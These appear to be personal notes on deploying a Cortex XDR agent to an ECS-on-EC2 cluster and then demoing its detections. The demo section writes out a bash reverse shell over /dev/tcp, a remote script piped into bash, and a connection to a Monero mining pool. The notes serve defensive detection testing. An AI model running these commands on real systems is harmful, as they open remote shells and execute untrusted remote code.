# How To Setup
## 1. Create installation

family : cortex-xdr-family
cluster : cortex-ecs-demo
![[Pasted image 20260423105525.png]]

## 2. Deploy the yaml file di cloudformation

```yaml
AWSTemplateFormatVersion: '2010-09-09'

Description: ECS EC2 Cluster with Auto Scaling


Parameters:

  KeyPair:

    Type: AWS::EC2::KeyPair::KeyName

    Description: SSH KeyPair

  

Resources:

  

  ECSCluster:

    Type: AWS::ECS::Cluster

  

  ECSInstanceRole:

    Type: AWS::IAM::Role

    Properties:

      AssumeRolePolicyDocument:

        Statement:

          - Effect: Allow

            Principal:

              Service: ec2.amazonaws.com

            Action: sts:AssumeRole

      ManagedPolicyArns:

        - arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role

  

  ECSInstanceProfile:

    Type: AWS::IAM::InstanceProfile

    Properties:

      Roles:

        - !Ref ECSInstanceRole

  

  LaunchTemplate:

    Type: AWS::EC2::LaunchTemplate

    Properties:

      LaunchTemplateData:

        ImageId: !Sub "{{resolve:ssm:/aws/service/ecs/optimized-ami/amazon-linux-2/recommended/image_id}}"

        InstanceType: c7i-flex.large

        KeyName: !Ref KeyPair

        IamInstanceProfile:

          Arn: !GetAtt ECSInstanceProfile.Arn

        UserData:

          Fn::Base64: !Sub |

            #!/bin/bash

            echo ECS_CLUSTER=${ECSCluster} >> /etc/ecs/ecs.config

  

  AutoScalingGroup:

    Type: AWS::AutoScaling::AutoScalingGroup

    Properties:

      MinSize: "1"

      MaxSize: "2"

      DesiredCapacity: "1"

      LaunchTemplate:

        LaunchTemplateId: !Ref LaunchTemplate

        Version: !GetAtt LaunchTemplate.LatestVersionNumber

      VPCZoneIdentifier:

      - subnet-0291a061691be2627

      - subnet-0c432451954d1eec9

Outputs:

  ClusterName:

    Value: !Ref ECSCluster
```



## 3. Upload task definition buat defender
```yaml
{
    "taskDefinitionArn": "arn:aws:ecs:ap-southeast-1:975050329730:task-definition/cortex-xdr-family:3",
    "containerDefinitions": [
        {
            "name": "cortex-xdr-container",
            "image": "distributions.traps.paloaltonetworks.com/agent-docker-pull/bbb3a221f940423b8fbad47048fb7535/method:9.1.0.144052",
            "cpu": 0,
            "memory": 2048,
            "portMappings": [],
            "essential": true,
            "entryPoint": [
                "/initd"
            ],
            "environment": [
                {
                    "name": "XDR_CLUSTER_NAME",
                    "value": "cortex-ecs-demo"
                },
                {
                    "name": "XDR_DISTRIBUTION_SERVER",
                    "value": "https://distributions.traps.paloaltonetworks.com"
                },
                {
                    "name": "XDR_DISTRIBUTION_ID",
                    "value": "bbb3a221f940423b8fbad47048fb7535"
                },
                {
                    "name": "XDR_HOST_ROOT",
                    "value": "/host-fs"
                },
                {
                    "name": "XDR_CONTAINER_NAME",
                    "value": "cortex-xdr-container"
                },
                {
                    "name": "XDR_CONTAINER_MODE",
                    "value": "ecsec2"
                }
            ],
            "mountPoints": [
                {
                    "sourceVolume": "host-fs",
                    "containerPath": "/host-fs",
                    "readOnly": true
                },
                {
                    "sourceVolume": "var-run",
                    "containerPath": "/var/run"
                },
                {
                    "sourceVolume": "var-log",
                    "containerPath": "/var/log"
                },
                {
                    "sourceVolume": "host-km-directory",
                    "containerPath": "/lib/modules"
                },
                {
                    "sourceVolume": "agent-ids",
                    "containerPath": "/etc/traps"
                }
            ],
            "volumesFrom": [],
            "linuxParameters": {
                "capabilities": {
                    "add": [
                        "SYS_ADMIN",
                        "SYSLOG",
                        "SYS_CHROOT",
                        "SYS_MODULE",
                        "SYS_PTRACE",
                        "SYS_RESOURCE",
                        "SYS_RAWIO",
                        "DAC_OVERRIDE",
                        "DAC_READ_SEARCH",
                        "NET_ADMIN",
                        "NET_RAW",
                        "IPC_LOCK",
                        "FOWNER",
                        "KILL",
                        "SETGID",
                        "SETUID"
                    ],
                    "drop": []
                }
            },
            "privileged": true,
            "readonlyRootFilesystem": false,
            "systemControls": []
        }
    ],
    "family": "cortex-xdr-family",
    "networkMode": "host",
    "revision": 3,
    "volumes": [
        {
            "name": "host-fs",
            "host": {
                "sourcePath": "/"
            }
        },
        {
            "name": "var-run",
            "host": {
                "sourcePath": "/var/run"
            }
        },
        {
            "name": "var-log",
            "host": {
                "sourcePath": "/var/log"
            }
        },
        {
            "name": "host-km-directory",
            "host": {
                "sourcePath": "/lib/modules"
            }
        },
        {
            "name": "agent-ids",
            "host": {
                "sourcePath": "/etc/traps"
            }
        }
    ],
    "status": "ACTIVE",
    "requiresAttributes": [
        {
            "name": "com.amazonaws.ecs.capability.privileged-container"
        },
        {
            "name": "ecs.capability.pid-ipc-namespace-sharing"
        },
        {
            "name": "com.amazonaws.ecs.capability.docker-remote-api.1.17"
        },
        {
            "name": "com.amazonaws.ecs.capability.docker-remote-api.1.18"
        }
    ],
    "placementConstraints": [],
    "compatibilities": [
        "EXTERNAL",
        "EC2"
    ],
    "runtimePlatform": {
        "cpuArchitecture": "X86_64",
        "operatingSystemFamily": "LINUX"
    },
    "requiresCompatibilities": [
        "EC2"
    ],
    "pidMode": "host",
    "ipcMode": "host",
    "registeredAt": "2026-04-20T16:03:48.501Z",
    "registeredBy": "arn:aws:iam::975050329730:root",
    "tags": []
}

```


## 4. Upload services di cluster

Cluster -> Services -> Create -> Pilih task agent -> Launch type EC2 -> Deployment configuration Daemon


# How To Demo


## 1. Masuk ke EC2 dulu karena ECS on EC2 judulnya

icacls ".\lab-key.pem" /inheritance:r
icacls ".\lab-key.pem" /remove "Users"
icacls ".\lab-key.pem" /remove "Authenticated Users"
icacls ".\lab-key.pem" /remove "EDWARDAL\Edward"
icacls ".\lab-key.pem" /grant:r "metrodata\edward.alexander:(R)"

icacls ".\lab-key.pem"

ssh -i ".\lab-key.pem" ec2-user@18.143.199.88


docker exec -it e30c6e799a05 /bin/bash

/bin/bash -c "echo hello"


# Sukses  Scenario
[ec2-user@ip-172-31-11-125 ~]$ sudo docker run -it --rm ubuntu /bin/bash
root@2c515cc73fa7:/# bash -i >& /dev/tcp/8.8.8.8/53 0>&1
root@2c515cc73fa7:/# [ec2-user@ip-172-31-11-125 ~]$
[ec2-user@ip-172-31-11-125 ~]$


### Reverse Shell Execution
docker exec -it 30faf5265e70 /bin/bash
root@2c515cc73fa7:/# bash -i >& /dev/tcp/8.8.8.8/53 0>&1

#### Note juga work di EC2-nya bukan cuma di dalem container
### 
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo.sh | bash

![[Pasted image 20260421125124.png]]

### Cryptomining simulated
echo '{"id":1,"method":"login","params":{"login":"test","pass":"test"}}' > /dev/tcp/pool.supportxmr.com/3333

![[Pasted image 20260421124803.png]]
![[Pasted image 20260421124712.png]]

